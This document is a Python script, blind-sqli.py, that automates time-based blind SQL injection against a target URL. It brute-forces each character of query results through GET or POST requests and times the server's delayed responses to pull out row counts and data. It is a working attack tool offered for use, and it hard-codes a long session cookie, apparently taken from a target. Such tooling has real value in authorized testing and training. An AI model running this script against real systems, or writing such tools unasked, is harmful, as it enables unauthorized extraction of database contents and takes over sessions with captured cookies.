#!/usr/bin/env python3

# blind-sqli.py vBeta
# Author: 0x5929 OS-91824
# Inspired by (partly): https://github.com/21y4d/blindSQLi 

# This script is developed to help automate the Blind SQL injection Process.
# Since in-band and error based SQL injection can be done much without automation, 
# Blind SQLi is attempting to try every ascii character for each query result of each row
# as one can imagine,this processes takes extremely long and can be compounded if time based technique is enabled

# We want to accomplish the following: (without automating too much and ecouraging kiddies)
# we will ask for user input and which paramters to automate


import sys, time, ast, requests, readline


TIMEOUT_BETWEEN_REQS = 1
DEBUG = False

def usage():
    message = """

        [!] Welcome to blind-sqli.py. A simple script trying to solve a complicated issue, SQLinjections.
        
        [*] Most SQLinjections can be categorized into: Inband (Error-based|Union-based) or Blind (Time-based|Boolean-based).
        [*] While most Inband SQL injections can be easily exploited, Blind SQL injections can pose some what of a problem. 
        [*] Blind SQL injection depends on testing each possible character in the ascii character set for each row of the returned query
        [*] as you may guess it, this will take a very long time, and methods of automation are often preferred.

        [!] Please take note that, YOU are responsible for entering the correct query payload, if not, results will not be accurate
        [!] it is always best to test a sample query in a web browser first to see if a server reaction can be generated 
        [*] such as a success resultant page - Bool based, or a calulated delayed response - Time based

        [!] Usage: 
        [*]     Method 1: python3 blind-sqli.py 
        [*]         (Enter all prompted inputs, special characters and quotes are not minded here) OR

        [*]    (Preferred) Method 2: bash run-blind-sqli.sh 
        [*]         (Enter all necessary values for prompted inputs, and run the run scripts, special care needed when handling special characters and quotes)

        [Final-Notes] Boolean based GET/POST injection not implemented
        [Final-Notes] Use responsibily!

        [PS.] If cookies, and addtional headers are required for each request, please edit time_inject function under the appropriate request type!


    """
    print(message)
    
    
def url_validation(req):
    vuln_url = input("\t[i] Vulnerable URL (full http/https path): ")
    res = req.get(vuln_url,verify=False)

    while res.status_code != 200:
        vuln_url = input("\t[i] Vulnerable URL (full http/https path): ")
        res = req.get(vuln_url,verify=False)

    return vuln_url

def type_validation():
    type_ = None

    while type_ is None:
        type_ = input("\t[i] Time based or Boolean based? [T/B]: ")

        if type_ == "T":
            pass
        elif type_ == "B":
            pass
        else:
            type_ == None

    return type_


def time_injection(req, url, TIME, row_count, rows=None, data=None):

    if row_count:
        fpayload = input("\t[i] Row counting full query, placeholder $c -> each ascii char; $p -> string position: ")
        DICTIONARY = "0123456789"
        method = None
        data = []
        rows = 1
    
        while method is None:
            method = input("\t[i] Request Method: [GET/POST] : ")

            if method == "POST":
                safe_data = ast.literal_eval(input("\t[i] Please enter a python dictionary of data you want to send excluding vulnerable param: "))
                vuln_param = input("\t[i] Now, please enter the vulnerable field: ")
                data = [safe_data, vuln_param]

            elif method == "GET":
                break
            else:
                method = None
    else:   # we already gotten row count, and can beginning extracting query results

        fpayload = input("\t[i] Data fetching full query, placeholder $c -> each ascii char; $p -> string position; $r -> row position: ")
        DICTIONARY = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
        data = data
        rows = rows
        method = "POST" if data else "GET"


    current_result = [ "" for x in range(0, int(rows)) ]
   
    for row in range(0,int(rows)):

        finished = False
        print("\n")

        for pos in range(0, 1000): # maximum 1000 decimal positions 
            if finished: break
    
            for char in range(0, len(DICTIONARY)): 
                ascii_rep = str(ord(DICTIONARY[char]))
                pos_rep = str(pos + 1)
                row_rep = str(row + 1)
                payload = fpayload.replace("$c", ascii_rep)
                payload = payload.replace("$p", pos_rep)
                
                if not row_count: payload = payload.replace("$r", row_rep)

                if DEBUG: 
                    print("*" * 200)
                    print("row: ", row_rep) 
                    print("pos: ", pos_rep) 
                    print("char: ", DICTIONARY[char]) 
                    print("acii_rep: ", ascii_rep)
                    print("currently: ", " ".join(current_result))
                
                elapse = time_inject(req, url, payload, method, data=data)
    
                if elapse >= float(TIME):
                    current_result[row] = current_result[row] + DICTIONARY[char] 
                    print("\t[o] Still trying: ", '\t'.join(current_result))
                    break
    
               # in the end 
                if char == (len(DICTIONARY) - 1):
                    if row_count:
                        rows = current_result[row]
                        print("\t[o] Total rows in your query: ", current_result[row])
                        time_injection(req, url, TIME, False, rows=rows, data=data)
                    else:
                        print("\t[o] Okay, we've got something: ", "\t".join(current_result))

                        if row == (int(rows) - 1): print("\t[o] Query complete: ", "\t".join(current_result))
                    
                    finished = True
                    break
    


def time_inject(req, url, payload, method, data):

    if method == "GET":

        # add cookies, and or headers necessary for the request
        cookies_dict = {"_userpro_medjed_session": "T1uG2mYNS6oEfXiE0T1AXOBJ7I%2B8rbRx8poyDFzZKpErpij1HtYRFh6FhG8kTAUB1q4cfwyGR1nzYsoGdA%2F3T%2Fmp3CDQFj%2BrRqINqZ6TTM73%2FwHUXhHpdsL1A0bvJpnVYluzp19mtHGCpWejwMIh4IV%2BtSFyDGqNZ%2FAeKwZUf55tunFqvrOAUDLbvQku8y9wjDyd%2FWQJCI7spBKtT%2B92VoR5X1MbDWdmzg3xnVhTlR994Z2EHuJCTf942YMm21jUpvAQystQ7%2BzkVIAbi4gugok%2BOPOqNEngCEm1vjS8iokOADzfc%2FCe0jRR1uaHn%2Fk%3D--5bB3RRfVvbknNKcD--r3dUknQz58%2BwcQ5xtYa2VQ%3D%3D"}
        # make sure we url encode the payload
        payloadurl = url + requests.utils.quote(payload)
        time.sleep(TIMEOUT_BETWEEN_REQS)
        start = time.time()

        res = req.get(payloadurl, verify=False, cookies=cookies_dict)

        if int(res.status_code) != 200:
            print("[!] Server responded a failing status code: ", res.status_code)
            print("[!] Check your query and try again, exiting...")
            sys.exit(2)

        elapse = time.time() - start
        return elapse

    elif method == "POST":

        # add cookies, and or headers necessary for the request

        data_ready = data[0]
        vuln_param = data[1]
        data_ready[vuln_param] = payload

        time.sleep(TIMEOUT_BETWEEN_REQS)
        start = time.time()
        #import json
        #print(json.dumps(data_ready,indent=4))

        res = req.post(url, data=data_ready, verify=False)

        if int(res.status_code) != 200:
            print("[!] Server responded a failing status code: ", res.status_code)
            print("[!] Check your query and try again, exiting...")
            sys.exit(2)

        elapse = time.time() - start
        return elapse


def bool_injection(req, url, TEXT):
    pass

def inject_prep(req):
    # get url
    url = url_validation(req)

    # bool or time
    inject_type = type_validation()
    
    if inject_type == "T":
        TIME = input("\t[i] How long to wait for? This MUST match your payload time: ")
        try: 
            time_injection(req, url, TIME, True)
        except KeyboardInterrupt: 
            print("[!] Requested shutoff, exiting...")
            sys.exit(1)
        except Exception as e: 
            print("[!] Error: ", e)
            sys.exit(2)
    else:
        TEXT = input("\t[i] What is the success response text? This MUST match your payload text: ")
        bool_injection(req, url, TEXT)


def main():
    usage()
    sess = requests.Session()
    inject_prep(sess)


if __name__ == "__main__":
    main()


